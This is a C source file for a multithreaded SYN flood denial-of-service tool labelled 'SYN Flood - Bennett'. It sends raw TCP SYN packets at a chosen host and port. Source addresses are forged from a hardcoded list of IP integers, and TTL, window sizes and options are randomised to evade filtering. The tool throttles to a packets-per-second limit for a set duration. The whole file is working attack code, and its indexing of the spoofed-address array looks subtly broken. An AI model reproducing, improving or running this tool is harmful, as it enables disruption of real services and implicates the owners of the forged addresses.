// SYN Flood - Bennett

#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

struct tcpopts
{
        uint8_t msskind;
        uint8_t msslen;
        uint16_t mssvalue;
        uint8_t nop_nouse;
        uint8_t wskind;
        uint8_t wslen;
        uint8_t wsshiftcount;
        uint8_t sackkind;
        uint8_t sacklen;
        uint8_t tstamp;
        uint8_t tslen;
        uint8_t tsno;
        uint8_t tsval;
        uint8_t tssendval;
        uint8_t tsecho;
};

void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++)
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c)
        {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
        int result = 0, low_num = 0, hi_num = 0;
        if (min_num < max_num)
        {
                low_num = min_num;
                hi_num = max_num + 1;
        }
        else
        {
                low_num = max_num + 1;
                hi_num = min_num;
        }
        result = (rand_cmwc() % (hi_num - low_num)) + low_num;
        return result;
}

unsigned short csum(unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while (count > 1)
        {
                sum += *buf++;
                count -= 2;
        }
        if (count > 0)
                sum += *(unsigned char *)buf;
        while (sum >> 16)
                sum = (sum & 0xffff) + (sum >> 16);
        return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int pipisize)
{
        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        // unsigned short total_len = iph->tot_len;
        pseudohead.src_addr = iph->saddr;
        pseudohead.dst_addr = iph->daddr;
        pseudohead.zero = 0;
        pseudohead.proto = IPPROTO_TCP;
        pseudohead.length = htons(sizeof(struct tcphdr) + pipisize);
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + pipisize;
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + pipisize);
        unsigned short output = csum(tcp, totaltcp_len);
        free(tcp);
        return output;
}

void setup_ip_header(struct iphdr *iph)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts);
        iph->id = htonl(54321);
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = inet_addr("0.0.0.0");
}

void setup_tcp_header(struct tcphdr *tcph)
{
        tcph->source = htons(5678);
        tcph->check = 0;
        tcph->syn = 1;
        tcph->window = htons(64240);
        tcph->doff = 5;
}

// int ctos[3] = {0, 40, 72};

int windows[5] = {
    8192, 14600, 29200, 64240, 65535};

void setup_tcpopts_header(struct tcpopts *opts)
{
        opts->nop_nouse = 0x01;
        opts->msskind = 0x03;
        opts->mssvalue = htons(randnum(1390, 1460));
        opts->msslen = 0x04;
        opts->wskind = 0x02;
        opts->wslen = 0x03;
        opts->wsshiftcount = 0x07;
        opts->sackkind = 0x04;
        opts->sacklen = 0x02;
        opts->tstamp = 0x08;
        opts->tslen = 0x0a;
        opts->tsno = randnum(1, 250);
        opts->tsval = 0x00000000;
        opts->tssendval = 0xa3;
        opts->tsecho = 0x00;
}

void *flood(void *par1)
{
        srand(time(NULL));
        char *td = (char *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
        struct tcpopts *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr); // including our specified tcp options in the datagram.
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(floodport);
        sin.sin_addr.s_addr = inet_addr(td);

        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
        if (s < 0)
        {
#ifdef DEBUG
                fprintf(stderr, "Could not open raw socket.\n");
#endif
                exit(-1);
        }

        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        setup_tcp_header(tcph);
        setup_tcpopts_header(opts);
        tcph->dest = htons(floodport);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum((unsigned short *)datagram, iph->tot_len);

        int tmp = 1;
        const int *val = &tmp;
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
        {
#ifdef DEBUG
                fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
#endif
                exit(-1);
        }

        int class[] = {
            2822726919,
            886817548,
            87605266,
            2343260161,
            3283462756,
            1256562711,
            2891074108,
            2626822406,
            1806995515,
            400776205,
            3119317767,
            870776603,
            1163627526,
            3464344340,
            1218232337,
            1141944393,
            1494700039,
            1505468937,
            1533459968,
            2475950099,
            1442840576,
            3263890435,
            1161452356,
            3255781378,
            3280658180,
            1246821901,
            1154903303,
            2858718303,
            3629053953,
            1257545749,
            1155406423,
            2293219453,
            261164035,
            3325626897,
            3255781422,
            1184090187,
            3258747649,
            2633576513,
            1155405058,
            1154901511,
            3653475625,
            649329690,
            1289617411,
            1732846088,
            2430926917,
            1412894721,
            1417019460,
            1111916562,
            1154582532,
            1107910923,
            84555812,
            1378484226,
            1648949764,
            3236197912,
            2657841153,
            3432120416,
            1257230348,
            2281736212,
            1760628295,
            3573612555,
            2328300668,
            1410411064,
            3034540071,
            1154884477,
            1252323361,
            2650671878,
            1091379225,
            1257570344,
            3244556813,
            1252315243,
            1155426389,
            1648996358,
            94273564,
            1154832408,
            2508066102,
            2332819759,
            3118840866,
            1401867008,
            1550943246,
            3266630193,
            1184047105,
            3224906752,
            1154771977,
            2621568517,
            1534854103,
            1189904465,
            2389666050,
            1533459756,
            1107913769,
            1154744354,
            2376359218,
            3629025029,
            3269675314};

        init_rand(time(NULL));
        register unsigned int i;
        i = 0;

        while (1)
        {
                setup_tcpopts_header(opts);
                tcph->check = 0;
                tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
                tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpopts)) / 4;
                tcph->dest = htons(floodport);
                iph->ttl = randnum(64, 255); // TTL values of windows devices vary from 64 all the way up to 182
                iph->saddr = htonl(class[rand_cmwc() % 480]);
                // Random src ip
                // iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
                iph->id = htonl(rand_cmwc() & 0xFFFF);
                iph->check = csum((unsigned short *)datagram, iph->tot_len);
                tcph->source = htons(rand_cmwc() & 0xFFFF);
                tcph->dest = htons(floodport);
                tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts));
                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
                // iph->tos = ctos[randnum(0,2)]; // we a really important service
                tcph->window = htons(windows[randnum(0, 4)]);
                pps++;

                if (i >= limiter)
                {
                        i = 0;
                        usleep(sleeptime);
                }
                i++;
        }
}

int main(int argc, char *argv[])
{
        if (argc < 6)
        {
#ifdef DEBUG
                fprintf(stderr, "Invalid Parameters!\n");
#endif
                fprintf(stdout, "%s [host] [port] [threads] [pps limiter, (-1 for none)] [time]\n", argv[0]);
                exit(-1);
        }

        // fprintf(stdout, "unnecessary text...\n");
        int num_threads = atoi(argv[3]);
        floodport = atoi(argv[2]);
        int maxpps = atoi(argv[4]);
        limiter = 0;
        pps = 0;
        pthread_t thread[num_threads];
        int multiplier = 12;

        int i;
        for (i = 0; i < num_threads; i++)
                pthread_create(&thread[i], NULL, &flood, (void *)argv[1]);

        fprintf(stdout, "Attack Sent!\n");
        for (i = 0; i < (atoi(argv[5]) * multiplier); i++)
        {
                usleep((1000 / multiplier) * 1000);
                if ((pps * multiplier) > maxpps)
                {
                        if (1 > limiter)
                                sleeptime += 100;
                        else
                                limiter--;
                }
                else
                {
                        limiter++;
                        if (sleeptime > 25)
                                sleeptime -= 25;
                        else
                                sleeptime = 0;
                }
                pps = 0;
        }
        return 0;
}